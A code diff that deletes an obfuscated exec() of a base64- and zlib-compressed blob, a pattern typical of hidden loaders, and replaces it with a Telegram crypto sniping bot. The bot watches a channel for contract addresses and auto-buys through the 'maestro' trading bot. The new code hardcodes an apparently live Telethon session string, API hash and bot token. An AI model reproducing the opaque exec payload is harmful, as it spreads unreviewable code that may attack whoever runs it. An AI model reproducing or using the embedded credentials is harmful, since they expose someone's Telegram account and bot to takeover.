@@ -1,2 +1,280 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode("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")).decode("utf-8"))
+import asyncio
+import os
+import re
+import logging
+from functools import wraps
+
+from telethon import TelegramClient, events
+from telethon.sessions import StringSession
+from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import (
+    Application,
+    CommandHandler,
+    CallbackQueryHandler,
+    MessageHandler,
+    ContextTypes,
+    filters,
+)
+
+logging.basicConfig(level=logging.INFO)
+logger = logging.getLogger(__name__)
+
+# --- جلسة النص (StringSession) ---
+SESSION_STRING = os.getenv("SESSION_STRING", "1BJWap1sBu3JY9awpmqTkj51uBuZiJyagDto0DjpRJjeLaUuJTQ69d2FQSfHy-in4KKoE7ig6SAmsGn8yQXeF3DzCtBkGBm53VL1meYxuBvigY95Amdu5jbFwc4zI0cl1b8lp7jcmgmGsazTUmr7vb05IXualVliMkRWLanVcnBu9aaPbKtOObXmSDdOn13WJE78OCJhoWXXOEhkqQ-q6KskZf2xyg6pPPBj0rUAvaFka5DvMY0cdi1E1rBrQfkJ_JVPLT8jiYqiM3kV1Q--Y3sRKhjnn-WZillqh6u8fRmzujkz9TUrPYfoKpZtCZ0UMSoA3dUMqCNnSpziHrg_ggIdXGDlI1Y0=")
+
+# --- إعدادات API (تقرأ من متغيرات البيئة) ---
+API_ID = int(os.getenv("API_ID", "31568734"))
+API_HASH = os.getenv("API_HASH", "7286e8c92ccc4dc698d771664bf71700")
+CONTROL_BOT_TOKEN = os.getenv("CONTROL_BOT_TOKEN", "8769711531:AAHML0z9xgdsPnzpsbQP6VwPeathADN01L8")
+
+tclient = TelegramClient(StringSession(SESSION_STRING), API_ID, API_HASH)
+
+OWNER_ID = None  # يُملأ تلقائيًا بأول مستخدم يرسل /start
+
+# --- إعدادات المراقبة ---
+CHANNEL = 'alihasanivip'
+TARGET_BOT = 'maestro'
+CONTRACT_PATTERN = re.compile(r'0x[a-fA-F0-9]{20,}')
+
+# ---------------- تخصيص السعر ----------------
+BUTTON_TEXT = os.getenv("BUTTON_TEXT", "0.00268 ETH")
+BUY_UNIT = os.getenv("BUY_UNIT", "ETH")
+
+_awaiting_price_input = False
+
+is_monitoring = False
+_control_context: ContextTypes.DEFAULT_TYPE = None
+_control_chat_id = None
+
+
+# ---------------- حماية: تقييد الأوامر بصاحب البوت فقط ----------------
+
+def owner_only(func):
+    @wraps(func)
+    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if OWNER_ID is not None and update.effective_chat.id != OWNER_ID:
+            await update.message.reply_text("هذا البوت خاص، غير مصرح لك باستخدامه.")
+            return
+        return await func(update, context)
+    return wrapper
+
+
+def owner_only_callback(func):
+    @wraps(func)
+    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
+        query = update.callback_query
+        if OWNER_ID is not None and query.message.chat.id != OWNER_ID:
+            await query.answer("غير مصرح لك.", show_alert=True)
+            return
+        return await func(update, context)
+    return wrapper
+
+
+async def click_bot_button(timeout_seconds=10):
+    done = asyncio.Event()
+    result = {"clicked": False}
+
+    async def target_reply_handler(event):
+        message = event.message
+        if message.buttons:
+            for row in message.buttons:
+                for button in row:
+                    if BUTTON_TEXT in button.text:
+                        await message.click(text=button.text)
+                        result["clicked"] = True
+                        done.set()
+                        return
+
+    tclient.add_event_handler(
+        target_reply_handler,
+        events.NewMessage(chats=TARGET_BOT)
+    )
+
+    try:
+        await asyncio.wait_for(done.wait(), timeout=timeout_seconds)
+    except asyncio.TimeoutError:
+        pass
+    finally:
+        tclient.remove_event_handler(target_reply_handler, events.NewMessage(chats=TARGET_BOT))
+
+    return result["clicked"]
+
+
+# ---------------- المستمع الفوري (event-driven) ----------------
+
+@tclient.on(events.NewMessage(chats=CHANNEL))
+async def on_new_channel_message(event):
+    if not is_monitoring:
+        return
+    if _control_context is None or _control_chat_id is None:
+        return
+
+    await _control_context.bot.send_message(_control_chat_id, "📩 القناة أرسلت رسالة جديدة.")
+
+    text = event.raw_text or ''
+    match = CONTRACT_PATTERN.search(text)
+    if not match:
+        return
+
+    contract_address = match.group()
+    await _control_context.bot.send_message(_control_chat_id, f"🔍 وُجد عقد: {contract_address}")
+
+    try:
+        if event.message.media:
+            await tclient.send_file(TARGET_BOT, event.message.media, caption=text)
+        else:
+            await tclient.send_message(TARGET_BOT, text)
+
+        clicked = await click_bot_button()
+        if clicked:
+            await _control_context.bot.send_message(
+                _control_chat_id,
+                f"✅ تم إتمام الأمر بنجاح (السعر المستخدم: {BUTTON_TEXT}).\nالعقد: {contract_address}"
+            )
+        else:
+            await _control_context.bot.send_message(
+                _control_chat_id,
+                f"⚠️ لم يُعثر على الزر المطلوب ({BUTTON_TEXT}) لدى {TARGET_BOT}. لم يتم تنفيذ الأمر.\nالعقد: {contract_address}"
+            )
+    except Exception as e:
+        logger.exception("خطأ أثناء معالجة الرسالة")
+        await _control_context.bot.send_message(_control_chat_id, f"❌ خطأ: {e}")
+
+
+# ---------------- أوامر بوت التحكم ----------------
+
+async def start_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global OWNER_ID
+    if OWNER_ID is None:
+        OWNER_ID = update.effective_chat.id
+
+    if not tclient.is_connected():
+        await tclient.connect()
+    authorized = await tclient.is_user_authorized()
+
+    if not authorized:
+        await update.message.reply_text(
+            "أهلاً. الجلسة غير صالحة أو منتهية الصلاحية.\n"
+            "يجب توليد جلسة جديدة وإعادة تشغيل البوت."
+        )
+        return
+
+    keyboard = [[InlineKeyboardButton("🔧 تخصيص السعر", callback_data="ask_price")]]
+    await update.message.reply_text(
+        "أهلاً. الحساب مسجل دخول. الأوامر المتاحة:\n"
+        "/run - بدء المراقبة الفورية\n"
+        "/stop - إيقاف المراقبة\n"
+        "/status - حالة الاتصال والمراقبة",
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
+
+@owner_only
+async def run_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global is_monitoring, _control_context, _control_chat_id
+    if not await tclient.is_user_authorized():
+        await update.message.reply_text("الجلسة غير صالحة. يجب تحديث SESSION_STRING.")
+        return
+    if is_monitoring:
+        await update.message.reply_text("المراقبة تعمل بالفعل.")
+        return
+
+    _control_context = context
+    _control_chat_id = update.effective_chat.id
+    is_monitoring = True
+    await update.message.reply_text("تم تشغيل المراقبة الفورية بنجاح.")
+
+
+@owner_only
+async def stop_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global is_monitoring
+    is_monitoring = False
+    await update.message.reply_text("تم إيقاف المراقبة.")
+
+
+@owner_only
+async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    authorized = await tclient.is_user_authorized()
+    keyboard = [[InlineKeyboardButton("🔧 تخصيص السعر", callback_data="ask_price")]]
+    await update.message.reply_text(
+        f"تسجيل الدخول: {'نعم' if authorized else 'لا'}\n"
+        f"المراقبة: {'تعمل (فورية)' if is_monitoring else 'متوقفة'}\n"
+        f"السعر الحالي (نص الزر): {BUTTON_TEXT}",
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
+
+@owner_only
+async def setbuy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    keyboard = [[InlineKeyboardButton("🔧 تخصيص السعر", callback_data="ask_price")]]
+    await update.message.reply_text(
+        f"السعر الحالي (نص الزر): {BUTTON_TEXT}\n"
+        f"عند الضغط على الزر، تكتب رقمًا فقط وسيُضاف {BUY_UNIT} تلقائيًا.",
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
+
+@owner_only_callback
+async def ask_price_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global _awaiting_price_input
+    query = update.callback_query
+    _awaiting_price_input = True
+    await query.answer()
+    await query.message.reply_text(
+        f"السعر الحالي: {BUTTON_TEXT}\n"
+        f"أرسل الآن الرقم فقط بدون كتابة {BUY_UNIT} (مثال: 0.005) وسيتم إضافة {BUY_UNIT} تلقائيًا."
+    )
+
+
+async def receive_price_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    global BUTTON_TEXT, _awaiting_price_input
+
+    if not _awaiting_price_input:
+        return
+
+    if OWNER_ID is not None and update.effective_chat.id != OWNER_ID:
+        return
+
+    raw_value = (update.message.text or "").strip()
+    normalized = raw_value.replace(",", ".").replace(BUY_UNIT, "").strip()
+
+    try:
+        number = float(normalized)
+    except ValueError:
+        await update.message.reply_text(
+            f"⚠️ يجب إرسال رقم فقط (مثال: 0.005) بدون كتابة {BUY_UNIT}، حاول مجددًا."
+        )
+        return
+
+    formatted_number = f"{number:.10f}".rstrip("0").rstrip(".")
+    if formatted_number == "" or formatted_number == "-":
+        formatted_number = "0"
+
+    BUTTON_TEXT = f"{formatted_number} {BUY_UNIT}"
+    _awaiting_price_input = False
+    await update.message.reply_text(f"✅ تم تعيين السعر الجديد إلى: {BUTTON_TEXT}")
+
+
+async def main():
+    await tclient.start()
+    logger.info("Telethon client متصل، بانتظار رسائل القناة...")
+
+    app = Application.builder().token(CONTROL_BOT_TOKEN).build()
+    app.add_handler(CommandHandler("start", start_cmd))
+    app.add_handler(CommandHandler("run", run_cmd))
+    app.add_handler(CommandHandler("stop", stop_cmd))
+    app.add_handler(CommandHandler("status", status_cmd))
+    app.add_handler(CommandHandler("setbuy", setbuy_cmd))
+    app.add_handler(CallbackQueryHandler(ask_price_callback, pattern="^ask_price$"))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, receive_price_text))
+
+    await app.initialize()
+    await app.start()
+    await app.updater.start_polling()
+    logger.info("بوت التحكم يعمل...")
+
+    await tclient.run_until_disconnected()
+
+
+if __name__ == '__main__':
+    asyncio.run(main())
